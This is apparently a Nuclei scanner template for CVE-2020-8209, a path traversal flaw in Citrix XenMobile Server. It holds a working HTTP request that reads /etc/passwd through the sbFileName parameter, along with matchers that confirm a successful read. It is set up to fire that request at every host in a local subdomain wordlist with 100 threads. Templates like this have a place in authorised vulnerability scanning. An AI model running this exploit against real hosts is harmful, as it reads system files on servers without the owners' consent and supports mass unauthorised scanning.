id: CVE-2020-8209
info:
  name: Citrix XenMobile Server Path Traversal
  author: dwisiswant0
  severity: high
  description: |
    Improper access control in Citrix XenMobile Server 10.12 before RP2,
    Citrix XenMobile Server 10.11 before RP4, Citrix XenMobile Server 10.10
    before RP6 and Citrix XenMobile Server before 10.9 RP5 and leads to the ability to read arbitrary files.

    References:
    - https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/
  tags: cve,cve2020,citrix,lfi
requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100
    raw:
      - |
        GET /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd HTTP/1.1
        Host: {{Subdomains}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body
      - type: word
        words:
          - "fileDownload=true"
          - "application/octet-stream"
          - "attachment;"
        condition: and
        part: header
